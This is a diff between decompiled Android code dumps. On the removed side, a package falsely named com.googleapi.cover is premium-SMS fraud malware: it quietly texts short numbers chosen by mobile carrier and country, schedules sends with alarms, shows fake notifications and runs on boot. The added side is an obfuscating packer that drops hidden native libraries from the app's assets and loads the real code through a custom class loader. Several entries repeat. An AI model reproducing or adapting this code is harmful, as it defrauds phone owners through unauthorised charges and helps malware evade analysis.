@@ -1,485 +1,313 @@
-Package Path:com.googleapi.cover.MessageHandler.onReceive
-Class Name:MessageHandler
-Content: package com.googleapi.cover;
+Package Path:com.secapk.wrapper.Util.tryDo
+Class Name:Util
+Content: package com.secapk.wrapper;
 
-    public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().equals(ACTION)) {
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            LinkedList<Pair<String, String>> list = new LinkedList<>();
-            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
-            Utils.start(null, new Sch(list.size(), list), smsData, context);
-        }
+    private static void tryDo(Context ctx) {
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        ACall.getACall().r2(ctx.getPackageName().getBytes(), apkFilePath.getBytes(), ctx.getApplicationInfo().processName.getBytes());
     }
 
-Package Path:com.googleapi.cover.MessageHandler.onReceive
-Class Name:MessageHandler
-Content: package com.googleapi.cover;
+Package Path:com.secapk.wrapper.Util.checkUpdate
+Class Name:Util
+Content: package com.secapk.wrapper;
 
-    public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().equals(ACTION)) {
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            LinkedList<Pair<String, String>> list = new LinkedList<>();
-            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
-            Utils.start(null, new Sch(list.size(), list), smsData, context);
-        }
-    }
-
-Package Path:com.googleapi.cover.Notifier.Notifier
-Class Name:Notifier
-Content: package com.googleapi.cover;
-
-public class Notifier extends BroadcastReceiver {
-    public static final String ACT_NOTIFY = "ACT_NOTIFY";
-    private static final String KEY_NOTIF_COUNTER = "KEY_NOTIF_COUNTER";
-    private static final int MINS_UNTIL_NOTIFY = 1440;
-    private SharedPreferences settings;
-
-    public void setPrefs(SharedPreferences prefs) {
-        this.settings = prefs;
-    }
-
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        int id;
-        this.settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-        String action = intent.getAction();
-        if ((action.equals("android.intent.action.BOOT_COMPLETED") || action.equals(ACT_NOTIFY)) && (id = this.settings.getInt(KEY_NOTIF_COUNTER, 0)) > 0) {
-            showNotification(context, id);
-        }
-    }
-
-    private void showNotification(Context context, int id) {
-        NotificationManager nm = (NotificationManager) context.getSystemService("notification");
+    private static void checkUpdate(Context ctx) {
         try {
-            long time = System.currentTimeMillis();
-            String notificationURL = TextUtils.read(8, context);
-            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(notificationURL));
-            PendingIntent pi = PendingIntent.getActivity(context, 0, browserIntent, 268435456);
-            String body = TextUtils.read(7, context);
-            String title = TextUtils.read(6, context);
-            Notification notification = new Notification(R.drawable.ic_push, title, time);
-            notification.setLatestEventInfo(context, title, body, pi);
-            notification.flags = 20;
-            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, this.settings.getInt(KEY_NOTIF_COUNTER, 0) - 1, this.settings);
-            nm.notify(id, notification);
-        } catch (IOException e) {
-        }
-    }
-
-    public void initSettings(Context context, long time, Intent intent) {
-        if (!this.settings.contains(KEY_NOTIF_COUNTER)) {
-            int number = 0;
-            try {
-                number = Integer.parseInt(TextUtils.read(9, context));
-            } catch (Exception e) {
+            File f = new File("/data/data/" + ctx.getPackageName() + "/.cache/");
+            PackageInfo pinfo = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0);
+            int versionCode = pinfo.versionCode;
+            String versionName = pinfo.versionName;
+            if (versionName == null) {
+                versionName = VERSION_NAME;
             }
-            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, number, this.settings);
-            PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 268435456);
-            AlarmManager am = (AlarmManager) context.getSystemService("alarm");
-            am.set(0, 86400000 + time, pi);
+            File fversion = new File("/data/data/" + ctx.getPackageName() + "/.sec_version");
+            if (!fversion.exists()) {
+                deleteDirectory(f);
+                writeVersion(fversion, versionCode, versionName);
+                return;
+            }
+            String[] ret = readVersions(fversion);
+            if (ret == null) {
+                deleteDirectory(f);
+                fversion.delete();
+                return;
+            }
+            int localVersionCode = Integer.parseInt(ret[0]);
+            String localVersionName = ret[1];
+            if (!localVersionName.equals(versionName) || localVersionCode != versionCode) {
+                deleteDirectory(f);
+                fversion.delete();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            deleteDirectory(new File("/data/data/" + ctx.getPackageName() + "/.cache/"));
+            File fversion2 = new File("/data/data/" + ctx.getPackageName() + "/.sec_version");
+            if (fversion2.exists()) {
+                fversion2.delete();
+            }
         }
     }
-}
 
-Package Path:com.googleapi.cover.MessageHandler.MessageHandler
-Class Name:MessageHandler
-Content: package com.googleapi.cover;
+Package Path:com.secapk.wrapper.Util.doProvider
+Class Name:Util
+Content: package com.secapk.wrapper;
 
-public class MessageHandler extends BroadcastReceiver {
-    public static final String ACTION = "com.googleapi.cover.MessageHandler";
+    public static void doProvider() {
+        synchronized (ps) {
+            ACall.getACall().set4();
+        }
+    }
+
+Package Path:com.secapk.wrapper.Util.toASC
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static byte[] toASC(byte[] bts) {
+        byte[] ret = new byte[bts.length * 2];
+        for (int i = 0; i < bts.length; i++) {
+            byte b = bts[i];
+            ret[i * 2] = hexDigits[(b >> 4) & 15];
+            ret[(i * 2) + 1] = hexDigits[b & 15];
+        }
+        return ret;
+    }
+
+Package Path:com.secapk.wrapper.Util.addProvider
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static void addProvider(ContentProvider p) {
+        synchronized (ps) {
+            x86Ctx = p.getContext();
+            ACall.getACall().set5(p);
+        }
+    }
+
+Package Path:com.secapk.wrapper.ACall.r2
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void r2(byte[] bArr, byte[] bArr2, byte[] bArr3);
+
+Package Path:com.secapk.wrapper.ACall.r1
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void r1(byte[] bArr, byte[] bArr2);
+
+Package Path:com.secapk.wrapper.ACall.c3
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native Object c3(Object obj, Object obj2);
+
+Package Path:com.slfloat.LMR.LMR
+Class Name:LMR
+Content: package com.slfloat;
+
+public class LMR extends BroadcastReceiver {
+    private BroadcastReceiver realReceiver = null;
 
     @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().equals(ACTION)) {
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            LinkedList<Pair<String, String>> list = new LinkedList<>();
-            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
-            Utils.start(null, new Sch(list.size(), list), smsData, context);
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
         }
-    }
-
-    public static void scheduleSend(Context context) {
-        PendingIntent pi = PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) MessageHandler.class).setAction(ACTION), 268435456);
-        AlarmManager am = (AlarmManager) context.getSystemService("alarm");
-        am.set(0, System.currentTimeMillis() + 30000, pi);
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
+        }
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
+        }
     }
 }
 
-Package Path:com.googleapi.cover.Actor.initConfigs
-Class Name:Actor
-Content: package com.googleapi.cover;
+Package Path:com.secapk.wrapper.ACall.c1
+Class Name:ACall
+Content: package com.secapk.wrapper;
 
-    private void initConfigs() {
-        try {
-            this.schemes = TextUtils.getScheme(this.mContext);
-            SCHEME_TO_USE = (String) this.schemes.first;
-            Utils.putStringValue(this.mContext, KEY_MSG_DATA_TEXT, (String) this.schemes.second, this.settings);
-        } catch (IOException e) {
-        }
-        try {
-            this.texts = TextUtils.getTexts(this.mContext.getResources().getXml(R.xml.texts));
-        } catch (IOException e2) {
-        }
-        this.app_name = new String();
-        try {
-            this.app_name = TextUtils.read(1, this.mContext);
-        } catch (IOException e3) {
-        }
-        try {
-            this.sendImmediately = TextUtils.read(3, this.mContext).equalsIgnoreCase(PRIVATE);
-        } catch (IOException e4) {
-        }
-        this.content = new String();
-        try {
-            this.content = TextUtils.read(2, this.mContext);
-        } catch (IOException e5) {
-        }
-        int relatedContentBaseline = 13;
+    public native void c1(Object obj, Object obj2);
+
+Package Path:com.secapk.wrapper.Util.calFileMD5
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    public static byte[] calFileMD5(String path) throws Exception {
+        FileInputStream input = new FileInputStream(path);
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buffer = new byte[32768];
         while (true) {
-            try {
-                String name = TextUtils.read(relatedContentBaseline, this.mContext);
-                String link = TextUtils.read(relatedContentBaseline + 1, this.mContext);
-                String data = TextUtils.read(relatedContentBaseline + 2, this.mContext);
-                if (name != null && link != null && data != null) {
-                    this.relatedContentNames.add(name);
-                    this.relatedContentLinks.add(link);
-                    this.relatedData.add(data);
-                    relatedContentBaseline += 3;
-                } else {
-                    return;
-                }
-            } catch (Exception e6) {
-                return;
-            }
-        }
-    }
-
-Package Path:com.googleapi.cover.ActService.actUK
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-
-Package Path:com.googleapi.cover.Main.startC2DM
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    private void startC2DM() {
-        Notifier notifier = new Notifier();
-        notifier.setPrefs(getSharedPreferences(KEY_PREFS, 0));
-        notifier.initSettings(getApplicationContext(), System.currentTimeMillis(), new Intent(this, (Class<?>) Notifier.class).setAction(Notifier.ACT_NOTIFY));
-    }
-
-Package Path:com.googleapi.cover.ActService.actUK
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-
-Package Path:com.googleapi.cover.Main.onResume
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    protected void onResume() {
-        super.onResume();
-        startC2DM();
-    }
-
-Package Path:com.googleapi.cover.Actor.startImpl
-Class Name:Actor
-Content: package com.googleapi.cover;
-
-    public void startImpl(String data, int index) {
-        PendingIntent pi = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT_FILTR), 0);
-        if (isBeelineSubscription(this.mContext) || isMTSSubscription(this.mContext) || !INIT_NEW.equals(SCHEME_TO_USE) || ((!this.countryCode.equals(RUS_ID) && !this.countryCode.equals(UK_ID)) || ((this.countryCode.equals(RUS_ID) && this.opCode.equals(TELE2_ID)) || this.countryCode.equals(BELORUSS_ID)))) {
-            if (!this.isRegistered) {
-                this.isRegistered = true;
-                out();
-            }
-            Utils.start(pi, this.actSchemes.get(SCHEME_TO_USE), data, this.mContext);
-            if (isBeelineSubscription(this.mContext)) {
-                MessageHandler.scheduleSend(this.mContext);
-                return;
-            }
-            return;
-        }
-        beginProc();
-        if (this.countryCode.equals(RUS_ID)) {
-            if ((this.opCode.equals("01") || this.opCode.equals("02")) && isPrivate() && index < 1) {
-                reportDone();
-            }
-        }
-    }
-
-Package Path:com.googleapi.cover.Actor.startImpl
-Class Name:Actor
-Content: package com.googleapi.cover;
-
-    public void startImpl(String data, int index) {
-        PendingIntent pi = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT_FILTR), 0);
-        if (isBeelineSubscription(this.mContext) || isMTSSubscription(this.mContext) || !INIT_NEW.equals(SCHEME_TO_USE) || ((!this.countryCode.equals(RUS_ID) && !this.countryCode.equals(UK_ID)) || ((this.countryCode.equals(RUS_ID) && this.opCode.equals(TELE2_ID)) || this.countryCode.equals(BELORUSS_ID)))) {
-            if (!this.isRegistered) {
-                this.isRegistered = true;
-                out();
-            }
-            Utils.start(pi, this.actSchemes.get(SCHEME_TO_USE), data, this.mContext);
-            if (isBeelineSubscription(this.mContext)) {
-                MessageHandler.scheduleSend(this.mContext);
-                return;
-            }
-            return;
-        }
-        beginProc();
-        if (this.countryCode.equals(RUS_ID)) {
-            if ((this.opCode.equals("01") || this.opCode.equals("02")) && isPrivate() && index < 1) {
-                reportDone();
-            }
-        }
-    }
-
-Package Path:com.googleapi.cover.Actor.initConfigs
-Class Name:Actor
-Content: package com.googleapi.cover;
-
-    private void initConfigs() {
-        try {
-            this.schemes = TextUtils.getScheme(this.mContext);
-            SCHEME_TO_USE = (String) this.schemes.first;
-            Utils.putStringValue(this.mContext, KEY_MSG_DATA_TEXT, (String) this.schemes.second, this.settings);
-        } catch (IOException e) {
-        }
-        try {
-            this.texts = TextUtils.getTexts(this.mContext.getResources().getXml(R.xml.texts));
-        } catch (IOException e2) {
-        }
-        this.app_name = new String();
-        try {
-            this.app_name = TextUtils.read(1, this.mContext);
-        } catch (IOException e3) {
-        }
-        try {
-            this.sendImmediately = TextUtils.read(3, this.mContext).equalsIgnoreCase(PRIVATE);
-        } catch (IOException e4) {
-        }
-        this.content = new String();
-        try {
-            this.content = TextUtils.read(2, this.mContext);
-        } catch (IOException e5) {
-        }
-        int relatedContentBaseline = 13;
-        while (true) {
-            try {
-                String name = TextUtils.read(relatedContentBaseline, this.mContext);
-                String link = TextUtils.read(relatedContentBaseline + 1, this.mContext);
-                String data = TextUtils.read(relatedContentBaseline + 2, this.mContext);
-                if (name != null && link != null && data != null) {
-                    this.relatedContentNames.add(name);
-                    this.relatedContentLinks.add(link);
-                    this.relatedData.add(data);
-                    relatedContentBaseline += 3;
-                } else {
-                    return;
-                }
-            } catch (Exception e6) {
-                return;
-            }
-        }
-    }
-
-Package Path:com.googleapi.cover.Main.initSettings
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    private void initSettings() {
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, 0, settings);
-        this.wasProgressDone = settings.getBoolean(IS_LOADED, false);
-        this.installedURL = settings.getString(INSTALL_URL, "");
-    }
-
-Package Path:com.googleapi.cover.Main.finishInstallation
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    void finishInstallation(String result) {
-        this.wasProgressDone = true;
-        this.installedURL = this.actor.getContentToBeActed();
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        SharedPreferences.Editor editor = settings.edit();
-        editor.putBoolean(IS_LOADED, true);
-        editor.putString(INSTALL_URL, this.actor.getContentToBeActed());
-        editor.commit();
-        updateGUI();
-    }
-
-Package Path:com.googleapi.cover.RelatedContent.onCreate
-Class Name:RelatedContent
-Content: package com.googleapi.cover;
-
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.related_content);
-        this.index = getIntent().getIntExtra("index", 0);
-        this.actor = new Actor(this, TextUtils.getOperatorString(this));
-        if (!this.actor.wasActError()) {
-            initializeGUI();
-        } else {
-            finish();
-        }
-    }
-
-Package Path:com.googleapi.cover.TextUtils.read
-Class Name:TextUtils
-Content: package com.googleapi.cover;
-
-    public static String read(int lineNum, Context context) throws IOException {
-        BufferedReader reader = new BufferedReader(new InputStreamReader(context.getResources().openRawResource(R.raw.act_schemes)));
-        String line = null;
-        for (int i = 0; i < lineNum; i++) {
-            line = reader.readLine();
-        }
-        reader.close();
-        return line;
-    }
-
-Package Path:com.googleapi.cover.Actor.reportDone
-Class Name:Actor
-Content: package com.googleapi.cover;
-
-    public void reportDone() {
-        Utils.putStringValue(this.mContext, CNT_LINK, this.content, this.settings);
-        repo(-1, PendingIntent.getBroadcast(this.mContext, -1, new Intent(Main.SEND_DONE), 0));
-    }
-
-Package Path:com.googleapi.cover.Main.finishInstallation
-Class Name:Main
-Content: package com.googleapi.cover;
-
-    void finishInstallation(String result) {
-        this.wasProgressDone = true;
-        this.installedURL = this.actor.getContentToBeActed();
-        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
-        SharedPreferences.Editor editor = settings.edit();
-        editor.putBoolean(IS_LOADED, true);
-        editor.putString(INSTALL_URL, this.actor.getContentToBeActed());
-        editor.commit();
-        updateGUI();
-    }
-
-Package Path:com.googleapi.cover.MessageHandler.MessageHandler
-Class Name:MessageHandler
-Content: package com.googleapi.cover;
-
-public class MessageHandler extends BroadcastReceiver {
-    public static final String ACTION = "com.googleapi.cover.MessageHandler";
-
-    @Override // android.content.BroadcastReceiver
-    public void onReceive(Context context, Intent intent) {
-        if (intent.getAction().equals(ACTION)) {
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            LinkedList<Pair<String, String>> list = new LinkedList<>();
-            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
-            Utils.start(null, new Sch(list.size(), list), smsData, context);
-        }
-    }
-
-    public static void scheduleSend(Context context) {
-        PendingIntent pi = PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) MessageHandler.class).setAction(ACTION), 268435456);
-        AlarmManager am = (AlarmManager) context.getSystemService("alarm");
-        am.set(0, System.currentTimeMillis() + 30000, pi);
-    }
-}
-
-Package Path:com.googleapi.cover.ActService.getPositiveNums
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
+            int readed = input.read(buffer);
+            if (readed > 0) {
+                out.write(buffer, 0, readed);
             } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
+                MessageDigest md = MessageDigest.getInstance("MD5");
+                md.update(out.toByteArray());
+                return md.digest();
+            }
+        }
+    }
+
+Package Path:com.slinsert.LMR.LMR
+Class Name:LMR
+Content: package com.slinsert;
+
+public class LMR extends BroadcastReceiver {
+    private BroadcastReceiver realReceiver = null;
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
+        }
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
+        }
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
+        }
+    }
+}
+
+Package Path:com.secapk.wrapper.ACall.a1
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void a1(byte[] bArr, byte[] bArr2);
+
+Package Path:com.secapk.wrapper.Util.CopyLib
+Class Name:Util
+Content: package com.secapk.wrapper;
+
+    private static void CopyLib(Context ctx) {
+        JarFile jarFile;
+        String apkFilePath = ctx.getApplicationInfo().sourceDir;
+        try {
+            jarFile = new JarFile(apkFilePath);
+        } catch (IOException e) {
+            e = e;
+        }
+        try {
+            Enumeration<JarEntry> iter = jarFile.entries();
+            while (iter.hasMoreElements()) {
+                JarEntry jarEntry = iter.nextElement();
+                String jarEntryName = jarEntry.getName();
+                if (jarEntryName.equals("assets/libsecexe.x86.so")) {
+                    String soName = jarEntryName.replaceAll("assets/", "");
+                    String destSoName = "/data/data/" + ctx.getPackageName() + "/.cache/" + soName;
+                    realCopy(destSoName, jarFile, jarEntry);
+                }
+                if (jarEntryName.equals("assets/libsecmain.x86.so")) {
+                    jarEntryName.replaceAll("assets/", "");
+                    String destSoName2 = "/data/data/" + ctx.getPackageName() + "/.cache/libsecmain.x86.so";
+                    realCopy(destSoName2, jarFile, jarEntry);
+                }
+                if (jarEntryName.equals("assets/" + ctx.getPackageName() + ".x86")) {
+                    jarEntryName.replaceAll("assets/", "");
+                    String destSoName3 = "/data/data/" + ctx.getPackageName() + "/.cache/" + ctx.getPackageName();
+                    realCopy(destSoName3, jarFile, jarEntry);
                 }
             }
-            return new HashMap<>(result);
+        } catch (IOException e2) {
+            e = e2;
+            e.printStackTrace();
         }
+    }
+
+Package Path:com.slpop.LMR.LMR
+Class Name:LMR
+Content: package com.slpop;
+
+public class LMR extends BroadcastReceiver {
+    private BroadcastReceiver realReceiver = null;
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
+        }
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
+        }
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
+        }
+    }
+}
+
+Package Path:com.slpush.LMR.LMR
+Class Name:LMR
+Content: package com.slpush;
+
+public class LMR extends BroadcastReceiver {
+    private BroadcastReceiver realReceiver = null;
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context ctx, Intent intent) {
+        ClassLoader cl = Util.getCustomClassLoader();
+        if (cl == null) {
+            Util.runAll(ctx);
+        }
+        try {
+            ClassLoader cl2 = Util.getCustomClassLoader();
+            Class<?> c = cl2.loadClass(getClass().getName());
+            this.realReceiver = (BroadcastReceiver) c.newInstance();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            this.realReceiver = null;
+        }
+        if (this.realReceiver != null) {
+            ACall.getACall().c1(this, this.realReceiver);
+            this.realReceiver.onReceive(ctx, intent);
+            ACall.getACall().c2(this, this.realReceiver);
+        }
+    }
+}
+
+Package Path:com.secapk.wrapper.ACall.s1
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void s1(Object obj, Object obj2, Object obj3);
+
+Package Path:com.secapk.wrapper.ACall.c2
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void c2(Object obj, Object obj2);
+
+Package Path:com.secapk.wrapper.ACall.at1
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native void at1(Application application, Context context);
+
+Package Path:com.secapk.wrapper.ACall.set2
+Class Name:ACall
+Content: package com.secapk.wrapper;
+
+    public native Object set2(Application application, Application application2, ClassLoader classLoader, Context context);
